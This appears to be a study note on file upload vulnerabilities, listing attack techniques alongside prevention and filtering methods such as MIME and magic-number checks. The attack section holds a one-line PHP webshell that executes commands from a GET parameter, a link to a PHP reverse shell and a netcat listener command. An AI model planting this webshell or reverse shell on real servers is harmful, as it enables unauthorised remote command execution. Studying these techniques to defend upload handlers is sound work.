# Upload Vulnerabilities

## Attacking

- Overwriting existing files on a server
  - Overwrite the same file name on the src path
- Uploading and Executing Shells on a server
  - Webshells
  ```php
  <?php
    echo system($_GET["cmd"]);
  ?>
  ```
  - Reverse/bind shells
    - https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
    - `nc -lvpn 1234`
- Bypassing Client-Side filtering
- Bypassing various kinds of Server-Side filtering
- Fooling content type validation checks

## Prevention 

- Assign the file with a new name or random or date and time
- Check filename already exists on the server
- File permission to protect existing files from being overwritten

## Filtering

- Extension validation
  - Blacklist
  - Whitelist
- File Type Filtering
  - MIME validation
    - Multipurpose Internet Mail Extension
      - image/jpeg (format: <type>/<subtype>)
      - Easy to bypass
  - Magic Number validation
    - A string of bytes at the very beginning of the file content
    - More effective than checking the extension of a file
    - Example: a PNG file at the very top of the file
      - `89 50 4E 47 0D 0A 1A 0A` = `.PNG.`
- File Length Filtering
- File Name Filtering
  - Sanitise any `bad characters` (e.g. null bytes, forward slashes, control char `;`, unicode char)
- File Content Filtering
  - Scan the full contents to ensure that it's not spoofing its extension, MIME type, Magic Number
